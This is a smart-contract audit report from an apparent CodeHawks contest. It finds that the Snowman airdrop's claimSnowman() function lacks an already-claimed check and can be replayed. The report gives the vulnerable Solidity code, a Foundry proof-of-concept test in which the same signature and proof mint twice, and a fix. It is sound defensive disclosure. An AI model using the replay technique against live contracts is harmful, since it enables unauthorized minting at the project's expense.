# Snowman Merkle Airdrop - Findings Report

# Table of contents


- ## Low Risk Findings
    - ### [L-01. Signature Replay in ```claimSnowman()``` Allows Multiple Claims per Signature](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #42

### Dates: Jun 12th, 2025 - Jun 19th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-06-snowman-merkle-airdrop)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 0
- Medium: 0
- Low: 1



    


# Low Risk Findings

## <a id='L-01'></a>L-01. Signature Replay in ```claimSnowman()``` Allows Multiple Claims per Signature            



# The function `claimSnowman()` does not check whether a user has already claimed their reward before** **processing the claim leading to over-minting of tokens.

## Description

* The `claimSnowman()` function is designed to allow eligible users to claim Snowman tokens **once**, by verifying their eligibility through a valid off-chain signature and a Merkle proof. After a successful claim, the contract should mark the user as having claimed to prevent multiple redemptions.

* The function fails to check whether a user has already claimed their tokens **before processing the claim**. As a result, a user can **replay the same valid signature and Merkle proof** multiple times to repeatedly claim rewards.

```Solidity
function claimSnowman(
        address receiver,
        bytes32[] calldata merkleProof,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external nonReentrant {
@>      //No check for user that already claim
        if (receiver == address(0)) {
            revert SA__ZeroAddress();
        }
        if (i_snow.balanceOf(receiver) == 0) {
            revert SA__ZeroAmount();
        }

        if (!_isValidSignature(receiver, getMessageHash(receiver), v, r, s)) {
            revert SA__InvalidSignature();
        }

        uint256 amount = i_snow.balanceOf(receiver);

        bytes32 leaf = keccak256(
            bytes.concat(keccak256(abi.encode(receiver, amount)))
        );

        if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
            revert SA__InvalidProof();
        }

        i_snow.safeTransferFrom(receiver, address(this), amount); // send tokens to contract... akin to burning

        s_hasClaimedSnowman[receiver] = true;

        emit SnowmanClaimedSuccessfully(receiver, amount);

        i_snowman.mintSnowman(receiver, amount);
    }
```

## Risk

**Likelihood**:

* This occurs **whenever a user holds the required** **`i_snow`** **balance** and has access to a valid signature and Merkle proof, they can repeatedly call `claimSnowman()` using the same data.

**Impact**:

* Users can **bypass the one-time claim restriction**, resulting in **unauthorized multiple claims** and **over-minting of Snowman tokens**.

## Proof of Concept

The test bellow prove that someone can claim twice .

```Solidity
function test_ReplayClaimWithSameSignatureAndProof() public {
        // Give Alice 1 Snow token and approve the airdrop contract
        deal(address(snow), alice, 1);
        vm.prank(alice);
        snow.approve(address(airdrop), 1);

        // Alice signs the claim message
        bytes32 digest = airdrop.getMessageHash(alice);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alKey, digest);

        // First claim (expected to succeed)
        vm.prank(satoshi);
        airdrop.claimSnowman(alice, AL_PROOF, v, r, s);
        assertEq(nft.balanceOf(alice), 1);

        // Replay: give Alice another 1 Snow token to repeat the claim
        deal(address(snow), alice, 1);
        vm.prank(alice);
        snow.approve(address(airdrop), 1);

        // Reuse the same proof and signature
        vm.prank(satoshi);
        airdrop.claimSnowman(alice, AL_PROOF, v, r, s);

        // Alice now has 2 NFTs (should only be 1) --->     This is BAD
        assertEq(nft.balanceOf(alice), 2); // Fails if protection is added
    }
r
```

## Recommended Mitigation

Before allowing a user to claim, the contract should **check if they’ve already claimed**. This is typically done using a `mapping(address => bool)` to store whether each user has claimed.

```diff
+ if (s_hasClaimedSnowman[receiver]) {
    revert SA__AlreadyClaimed();
}
```



